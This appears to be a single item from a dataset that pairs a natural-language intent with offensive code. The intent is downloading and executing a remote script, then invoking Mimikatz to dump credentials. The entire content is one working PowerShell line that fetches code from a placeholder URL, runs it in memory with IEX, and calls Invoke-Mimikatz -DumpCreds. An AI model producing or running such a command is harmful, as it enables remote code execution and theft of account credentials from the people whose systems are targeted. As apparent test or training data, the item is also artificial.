# Natural language intent:
# Downloads and executes a remote script, followed by invoking Mimikatz to dump credentials.

IEX (New-Object Net.WebClient).DownloadString('${RemoteSc}'); Invoke-Mimikatz -DumpCreds
